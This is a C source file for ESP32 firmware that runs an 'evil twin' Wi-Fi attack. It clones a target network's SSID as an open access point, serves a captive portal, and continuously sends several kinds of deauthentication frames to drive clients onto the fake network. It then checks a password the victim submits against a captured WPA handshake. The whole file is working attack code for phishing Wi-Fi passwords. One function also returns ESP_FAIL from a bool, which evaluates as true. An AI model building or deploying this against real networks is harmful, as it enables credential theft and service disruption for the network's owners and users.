#include <string.h>
#include "esp_log.h"
#include "esp_task_wdt.h"
#include "utils.h"
#include "wifiMng.h"
#include "admin_server.h"
#include "server.h"
#include "evil_twin.h"
#include "aircrack.h"
#include "wifi_attacks.h"


/* Store target information */
static const char *TAG = "EVIL_TWIN:";
static target_info_t target = { 0 };
static TaskHandle_t evil_twin_task_handle = NULL;


static void evil_twin_task(void *pvParameters) 
{
    vTaskDelay(pdMS_TO_TICKS(1000));

    /* Stop admin server TODO: Verificare se possibile lasciarlo attivo se non usa troppa ram */
    http_admin_server_stop();

    /* Get target information */
    /*Try guess by ssid */
    target.vendor = getVendor((char *)&target.ssid);

    /* Clone Access Point */
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = { 0 },
            .ssid_len = 0,
            .channel = target.channel,
            .password = "",
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                    /* Cannot set pmf to required when in wpa-wpa2 mixed mode! Setting pmf to optional mode. */
                    .required = false, 
                    .capable = true
            }
        },
    };
    strcpy((char *)&wifi_config.ap.ssid, (char *)&target.ssid);
    wifi_ap_clone(&wifi_config, NULL);

    /* Wait AP to be cloned */
    vTaskDelay(pdMS_TO_TICKS(5000));

    /* Start captive portal server */
    http_attack_server_start((target_info_t * )&target);

    /* Start wifi attack engine */
    wifi_attack_engine_start((target_info_t * )&target);

    while(true)
    {
        wifi_attack_deauth_basic();
        wifi_attack_deauth_ap_eapol_logoff();
        wifi_attack_deauth_client_negative_tx_power();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}


void evil_twin_start_attack(target_info_t *targe_info)
{
    if( evil_twin_task_handle != NULL )
    {   
        ESP_LOGE(TAG, "EvilTwin task already started.");
        return;
    }

    memcpy(&target, targe_info, sizeof(target_info_t));
    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 5, &evil_twin_task_handle);
}


void evil_twin_stop_attack(void)
{
    if (evil_twin_task_handle == NULL)
    {
        ESP_LOGE(TAG, "EvilTwin task is not running.");
        return;
    }
    
    /* Kill task */
    vTaskDelete(evil_twin_task_handle);
    evil_twin_task_handle = NULL;

    /* Close attack server */
    http_attack_server_stop();

    /* Stop attack engine */
    wifi_attack_engine_stop();

    /* Restore original hotspot */
    wifi_start_softap();

    /* Wait softap restpre */
    vTaskDelay(3000);

    /* Start Admin server */
    http_admin_server_start();
}


bool evil_twin_check_password(char *password)
{
    handshake_info_t *handshake = wifi_attack_engine_handshake();

    if( handshake->handshake_captured == false )
    {
        return ESP_FAIL;
    }
    else
    {
        //return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic);
    }
}